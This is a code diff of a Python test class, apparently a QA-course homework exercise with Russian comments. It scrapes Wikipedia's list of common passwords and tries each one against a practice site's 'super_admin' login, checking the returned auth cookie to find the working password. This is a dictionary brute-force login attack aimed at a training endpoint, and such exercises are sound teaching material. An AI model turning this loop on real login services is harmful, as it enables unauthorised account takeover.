@@ -4,7 +4,7 @@ from lxml import html
 
 
 class TestSecretLogin:
-#Парсинг пароля
+    #Парсинг пароля
     response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
 
     tree = html.fromstring(response.text)
@@ -19,25 +19,33 @@ class TestSecretLogin:
         password = str(password).strip()
         temp.append(password)
 
+    #убираем дубликаты паролей
     new_list = list(set(temp))
 
+    #авторизуемся подбирая нужный пароль и получаем куку
+    for passwd in new_list:
 
-#for x in new_list:
-#    print()
-    @pytest.mark.parametrize("pass", new_list)
-    def get_secret_password_homework(self, passwd):
         data = {"login": "super_admin", "password": passwd}
+
         link = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
 
         response1 = requests.post(link, data=data)
 
-        print(response1.content)
-        print(response1.status_code)
-
-        assert response1.status_code == 200, "wrong response code"
+        auth_sid = response1.cookies.get("auth_cookie")
 
         link2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
 
-#
+        response2 = requests.get(
+            link2,
+            cookies={"auth_cookie": auth_sid}
+        )
 
-#check_auth_cookie.
+        if response2.text == "You are authorized":
+            print(passwd)
+
+        #  assert response2.content == "You are authorized", "You are NOT authorized"
+
+
+
+
+
